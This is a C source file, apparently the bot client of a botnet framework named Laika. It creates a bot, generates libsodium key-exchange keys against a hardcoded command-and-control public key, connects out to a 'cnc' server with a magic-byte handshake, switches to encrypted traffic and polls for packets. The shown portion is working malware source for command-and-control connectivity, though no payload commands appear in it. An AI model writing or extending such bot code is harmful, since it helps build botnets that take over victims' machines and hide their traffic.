#include "lmem.h"
#include "lrsa.h"
#include "lerror.h"
#include "bot.h"

LAIKAPKT_SIZE laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t)
};

void handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;
    uint8_t endianness = laikaS_readByte(&peer->sock);

    peer->sock.flipEndian = endianness != laikaS_isBigEndian();
    LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n", (endianness ? "TRUE" : "FALSE"));
}

PeerPktHandler laikaB_handlerTbl[LAIKAPKT_MAXNONE] = {
    [LAIKAPKT_HANDSHAKE_RES] = handleHandshakeResponse
};

struct sLaika_bot *laikaB_newBot(void) {
    struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
    size_t _unused;

    laikaP_initPList(&bot->pList);
    bot->peer = laikaS_newPeer(
        laikaB_handlerTbl,
        laikaB_pktSizeTbl,
        &bot->pList,
        (void*)bot
    );

    /* generate keypair */
    if (sodium_init() < 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    if (crypto_kx_keypair(bot->pub, bot->priv) != 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to gen keypair!\n");
    }

    /* read cnc's public key into peerPub */
    if (sodium_hex2bin(bot->peer->peerPub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to init cnc public key!\n");
    }

    return bot;
}

void laikaB_freeBot(struct sLaika_bot *bot) {
    laikaP_cleanPList(&bot->pList);
    laikaS_freePeer(bot->peer);
    laikaM_free(bot);
}

void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
    struct sLaika_socket *sock = &bot->peer->sock;

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);

    laikaP_addSock(&bot->pList, sock);

    /* queue handshake request */
    laikaS_startOutPacket(bot->peer, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
    laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
    laikaS_endOutPacket(bot->peer); /* force packet body to be plaintext */
    laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */

    if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n")

    if (!laikaS_handlePeerOut(bot->peer))
        LAIKA_ERROR("failed to send handshake request!\n")
}

bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
    struct sLaika_pollEvent *evnt;
    int numEvents;

    evnt = laikaP_poll(&bot->pList, timeout, &numEvents);

    if (numEvents == 0) /* no events? timeout was reached */
        return false;

LAIKA_TRY
    if (evnt->pollIn && !laikaS_handlePeerIn(bot->peer))
        goto _BOTKILL;

    if (evnt->pollOut && !laikaS_handlePeerOut(bot->peer))
        goto _BOTKILL;

    if (!evnt->pollIn && !evnt->pollOut)
        goto _BOTKILL;
LAIKA_CATCH
_BOTKILL:
    laikaS_kill(&bot->peer->sock);
LAIKA_TRYEND

    return true;
}